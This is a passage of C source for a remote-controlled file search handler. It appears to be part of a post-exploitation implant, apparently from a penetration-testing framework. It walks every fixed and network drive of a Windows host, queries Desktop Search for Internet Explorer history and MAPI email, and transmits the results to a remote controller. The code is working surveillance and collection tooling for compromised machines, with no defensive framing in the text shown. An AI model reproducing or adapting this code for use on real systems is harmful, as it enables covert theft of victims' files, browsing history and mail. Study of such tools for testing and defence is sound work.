			BREAK_WITH_ERROR( "[SEARCH] request_fs_search: pResponse == NULL", ERROR_INVALID_HANDLE );

		pOptions = (SEARCH_OPTIONS *)malloc( sizeof(SEARCH_OPTIONS) );
		if( !pOptions )
			BREAK_WITH_ERROR( "[SEARCH] search_via_api: !pOptions", ERROR_OUTOFMEMORY );

		pOptions->cpRootDirectory = packet_get_tlv_value_string( pPacket, TLV_TYPE_SEARCH_ROOT );
		if( !pOptions->cpRootDirectory )
			pOptions->cpRootDirectory = "";

		if( strlen( pOptions->cpRootDirectory ) == 0 )
			pOptions->cpRootDirectory = NULL;

		pOptions->bResursive = packet_get_tlv_value_bool( pPacket, TLV_TYPE_SEARCH_RECURSE );

		pOptions->cpFileGlob = packet_get_tlv_value_string( pPacket, TLV_TYPE_SEARCH_GLOB );
		if( !pOptions->cpFileGlob )
			pOptions->cpFileGlob = "*.*";

		wds_startup( &WDSInterface );

		if( !pOptions->cpRootDirectory )
		{
			DWORD dwLogicalDrives = 0;
			char cIndex           = 0;

			dwLogicalDrives = GetLogicalDrives();

			for( cIndex='a' ; cIndex<='z' ; cIndex++ )
			{
				if( dwLogicalDrives & ( 1 << (cIndex-'a')) )
				{
					DWORD dwType   = 0;
					char cDrive[4] = {0};

					sprintf_s( cDrive, 4, "%c:\\\x00", cIndex );
				
					dwType = GetDriveType( cDrive );

					if( dwType == DRIVE_FIXED || dwType == DRIVE_REMOTE )
					{
						pOptions->cpRootDirectory = (char *)&cDrive;

						dprintf( "[SEARCH] request_fs_search. Searching drive %s (type=%d)...", pOptions->cpRootDirectory, dwType );

						search( &WDSInterface, NULL, pOptions, pResponse );
					}

				}
			}

			pOptions->cpRootDirectory = "";

			wds3_search( &WDSInterface, L"iehistory", NULL, pOptions, pResponse );
			wds3_search( &WDSInterface, L"mapi", NULL, pOptions, pResponse );
		}
		else
		{
			if( strcmp( pOptions->cpRootDirectory, "iehistory" ) == 0 )
			{
				pOptions->cpRootDirectory = "";
				wds3_search( &WDSInterface, L"iehistory", NULL, pOptions, pResponse );
			}
			else if( strcmp( pOptions->cpRootDirectory, "mapi" ) == 0 )
			{
				pOptions->cpRootDirectory = "";
				wds3_search( &WDSInterface, L"mapi", NULL, pOptions, pResponse );
			}
			else
			{
				dwResult = search( &WDSInterface, NULL, pOptions, pResponse );
			}
		}


	} while( 0 );

	if( pResponse )
	{
		packet_add_tlv_uint( pResponse, TLV_TYPE_RESULT, dwResult );

		dwResult = packet_transmit( pRemote, pResponse, NULL );
	}

	wds_shutdown( &WDSInterface );

	if( pOptions )
		free( pOptions );

	dprintf( "[SEARCH] request_fs_search: Finished. dwResult=0x%08X", dwResult );

	return dwResult;
}